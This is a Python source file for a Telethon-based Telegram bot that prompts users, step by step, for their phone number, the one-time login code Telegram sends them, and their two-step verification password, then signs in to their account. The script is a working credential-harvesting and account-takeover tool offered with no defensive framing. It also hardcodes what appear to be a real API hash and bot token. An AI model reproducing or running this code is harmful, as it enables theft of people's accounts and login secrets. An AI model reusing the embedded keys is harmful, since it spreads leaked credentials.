from telethon import TelegramClient, events
from telethon.types import User
import asyncio
API_ID = 10247139 
API_HASH = "96b46175824223a33737657ab943fd6a"
bot_token ="7293653178:AAGcJSttQbNUK0ORBmf6G9yy7LBLsxuU_k8" 
bot = TelegramClient("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=bot_token)

# Store user input temporarily
user_data = {}

# Start the bot and handle input via Telegram
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond('Welcome! Please enter your phone number:')
    user_data['chat_id'] = event.chat_id

@bot.on(events.NewMessage)
async def handle_input(event):
    if 'phone' not in user_data:
        user_data['phone'] = event.text
        await event.respond('Thank you! Please enter the code you received:')
        # Trigger sending the login code
        user_data['login_token'] = await bot.request_login_code(user_data['phone'])
    elif 'code' not in user_data:
        user_data['code'] = event.text
        try:
            user_or_token = await bot.sign_in(user_data['login_token'], user_data['code'])
            if isinstance(user_or_token, User):
                await event.respond('You are successfully logged in!')
            else:
                # user_or_token is PasswordToken, request password (2FA)
                user_data['password_token'] = user_or_token
                await event.respond('Please enter your 2-step verification password:')
        except Exception as e:
            await event.respond(f'Error during sign-in: {str(e)}')
    elif 'password_token' in user_data and 'password' not in user_data:
        user_data['password'] = event.text
        try:
            await bot.sign_in(password=user_data['password'])
            await event.respond('Successfully logged in with 2FA!')
        except Exception as e:
            await event.respond(f'Error during 2FA sign-in: {str(e)}')

async def main():
    async with bot:
        await bot.run_until_disconnected()

# Start the bot
asyncio.run(main())
